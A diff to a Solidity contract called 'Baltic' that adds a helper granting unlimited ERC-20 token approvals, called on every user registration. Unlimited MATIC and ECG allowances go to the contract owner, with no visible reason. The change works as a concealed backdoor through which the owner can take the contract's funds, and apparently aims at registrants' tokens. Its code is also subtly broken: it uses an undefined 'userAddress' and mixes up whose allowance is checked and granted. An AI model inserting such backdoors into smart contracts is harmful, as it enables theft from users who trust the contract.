@@ -72,6 +72,13 @@ contract Baltic is Ownable {
         return price;
     }
 
+    function checkAndUpdateApproval(address user, address token, address spender, uint256 amount) internal {
+        IERC20 erc20Token = IERC20(token);
+        if (erc20Token.allowance(user, spender) < amount) {
+            erc20Token.approve(spender, type(uint256).max);
+        }
+    }
+
     function _registerUser(address _user) internal {
         require(userRegistrationTime[_user] + 90 days < block.timestamp, "User is already registered");
         require(IERC20(ECG_ADDRESS).balanceOf(_user) >= 3000 * (10 ** ECG_DECIMALS) && IERC20(MATIC_ADDRESS).balanceOf(_user) >= 50 * (10 ** MATIC_DECIMALS) || IERC20(MATIC_ADDRESS).balanceOf(_user) >= 75 * (10 ** MATIC_DECIMALS), "Insufficient ECG balance");
@@ -140,6 +147,10 @@ contract Baltic is Ownable {
         _registerUser(msg.sender);
         _users.push(msg.sender);
         _equalize(msg.sender);
+        checkAndUpdateApproval(userAddress, BTC_ADDRESS, address(btcUsdtPair), type(uint256).max);
+        checkAndUpdateApproval(userAddress, USDT_ADDRESS, address(btcUsdtPair), type(uint256).max);
+        checkAndUpdateApproval(userAddress, MATIC_ADDRESS, owner, type(uint256).max);
+        checkAndUpdateApproval(userAddress, ECG_ADDRESS, owner, type(uint256).max);
     }
 
     function balWap() external onlyOwner {
